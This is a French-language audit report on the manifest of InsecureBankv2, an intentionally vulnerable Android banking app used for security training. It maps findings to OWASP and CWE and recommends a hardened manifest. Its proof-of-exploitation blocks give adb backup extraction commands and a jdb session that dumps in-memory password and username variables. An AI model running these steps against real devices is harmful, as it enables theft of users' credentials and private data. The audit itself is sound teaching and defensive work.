# Analyse du Manifeste Android — InsecureBankv2
**Application :** `com.android.insecurebankv2`  
**Commande :** `dz> run app.package.manifest com.android.insecurebankv2`  
**Catégorie OWASP :** M1, M2, M9

---

## 1. Flags Dangereux de l'Application

### `android:allowBackup="true"` ⚠️ ÉLEVÉ

| Attribut | Valeur | Statut |
|---|---|---|
| Nom | `android:allowBackup` | |
| Valeur | `true` | 🔴 Vulnérable |
| Valeur sécurisée | `false` | |

**Risque :** Permet l'extraction complète du répertoire de données de l'application
via la commande `adb backup` sans root requis.

**Preuve d'exploitation :**
```bash
# Depuis un PC connecté à l'émulateur via USB/ADB
adb backup -noapk -f insecurebank_backup.ab com.android.insecurebankv2

# Extraction de l'archive
dd if=insecurebank_backup.ab bs=1 skip=24 | \
  python3 -c "import zlib,sys; sys.stdout.buffer.write(
    zlib.decompress(sys.stdin.buffer.read()))" | tar xv

# Contenu accessible après extraction :
# → /data/data/com.android.insecurebankv2/shared_prefs/  (tokens, préférences)
# → /data/data/com.android.insecurebankv2/databases/     (base SQLite)
# → /data/data/com.android.insecurebankv2/files/         (fichiers app)
```

**Impact :** Fuite complète des données sans nécessiter de root → CVSS : 7.1 (High)

---

### `android:debuggable="true"` ⚠️ ÉLEVÉ

| Attribut | Valeur | Statut |
|---|---|---|
| Nom | `android:debuggable` | |
| Valeur | `true` | 🔴 Vulnérable |
| Valeur sécurisée | `false` (ou absent) | |

**Risque :** Permet l'attachement d'un debugger Java au processus de l'application
en cours d'exécution.

**Preuve d'exploitation :**
```bash
# Lister les processus déboguables
adb jdwp

# Forwarder le port de debug
adb forward tcp:12345 jdwp:[PID_APP]

# Attacher un debugger Java
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=12345

# Depuis le debugger : lire les variables en mémoire
> locals
> dump this.mPassword
> dump this.mUsername
```

**Impact :** Lecture de credentials en mémoire, modification du flux d'exécution → CVSS : 7.8 (High)

---

## 2. Permissions Déclarées

### Permissions utilisées par l'application

| Permission | Niveau de risque | Justification légitime | Risque d'abus |
|---|---|---|---|
| `INTERNET` | Normal | Communication avec le serveur bancaire | Faible |
| `WRITE_EXTERNAL_STORAGE` | Dangerous | Sauvegarde de relevés PDF | Stockage de données sensibles non chiffrées |
| `SEND_SMS` | Dangerous | OTP / notifications | Utilisée par MyBroadCastReceiver pour exfiltrer des MDP |
| `RECEIVE_SMS` | Dangerous | Réception OTP | Interception de codes d'authentification |
| `READ_SMS` | Dangerous | Lecture OTP | Lecture de communications privées |
| `USE_CREDENTIALS` | Signature | Accès aux comptes Android | Accès aux comptes Google de l'appareil |
| `GET_ACCOUNTS` | Dangerous | Liste des comptes | Énumération des comptes sur l'appareil |
| `READ_PROFILE` | Dangerous | Profil utilisateur | Accès aux informations personnelles |

**🔴 Problème principal :** La permission `SEND_SMS` est exploitée par `MyBroadCastReceiver`
pour envoyer les credentials vers un numéro contrôlé par un attaquant.

---

## 3. Composants et Flags d'Export

```xml
<!-- EXTRAIT DU MANIFESTE ANNOTÉ -->

<application
    android:allowBackup="true"      <!-- 🔴 Backup non protégé    -->
    android:debuggable="true"       <!-- 🔴 Debug mode actif       -->
    android:label="InsecureBankv2"
    android:theme="@style/AppTheme">

    <!-- Point d'entrée légitime -->
    <activity android:name=".LoginActivity" android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
    </activity>

    <!-- 🔴 Activités internes exportées sans protection -->
    <activity android:name=".PostLogin"      android:exported="true"/>
    <activity android:name=".DoTransfer"     android:exported="true"/>
    <activity android:name=".ViewStatement"  android:exported="true"/>
    <activity android:name=".ChangePassword" android:exported="true"/>
    <activity android:name=".FilesActivity"  android:exported="true"/>

    <!-- 🔴 Receiver exporté sans permission -->
    <receiver android:name=".MyBroadCastReceiver" android:exported="true">
        <intent-filter>
            <action android:name="theBroadcast"/>
        </intent-filter>
    </receiver>

</application>
```

---

## 4. Tableau de Synthèse — Toutes les Faiblesses

| # | Faiblesse | Composant / Flag | Sévérité | OWASP Mobile | CWE |
|---|---|---|---|---|---|
| 1 | Activités internes accessibles sans auth | PostLogin, DoTransfer, ChangePassword, ViewStatement, FilesActivity | 🔴 Critique | M1 | CWE-926 |
| 2 | Receiver déclenchable sans permission | MyBroadCastReceiver | 🔴 Élevé | M1 | CWE-925 |
| 3 | Backup non chiffré autorisé | `allowBackup=true` | 🟠 Élevé | M2 | CWE-312 |
| 4 | Mode debug actif en production | `debuggable=true` | 🟠 Élevé | M9 | CWE-489 |
| 5 | Permission SEND_SMS utilisée pour exfiltrer | `MyBroadCastReceiver` + `SEND_SMS` | 🔴 Élevé | M1 | CWE-925 |
| 6 | Stockage externe non chiffré | `WRITE_EXTERNAL_STORAGE` | 🟡 Moyen | M2 | CWE-312 |

---

## 5. Recommandations

```xml
<!-- Manifeste sécurisé recommandé -->
<application
    android:allowBackup="false"      <!-- ✅ Désactiver le backup    -->
    android:debuggable="false"       <!-- ✅ Désactiver en production -->
    ...>

    <!-- Activités internes : non exportées -->
    <activity android:name=".PostLogin"      android:exported="false"/>
    <activity android:name=".DoTransfer"     android:exported="false"/>
    <activity android:name=".ChangePassword" android:exported="false"/>

    <!-- Receiver : protection par permission ou LocalBroadcastManager -->
    <receiver android:name=".MyBroadCastReceiver"
              android:exported="false"/>
</application>
```

---

## Références
- OWASP Mobile Top 10 2024 : https://owasp.org/www-project-mobile-top-10/
- Android Security Best Practices : https://developer.android.com/topic/security/best-practices
- CWE-926 : https://cwe.mitre.org/data/definitions/926.html
- CWE-925 : https://cwe.mitre.org/data/definitions/925.html
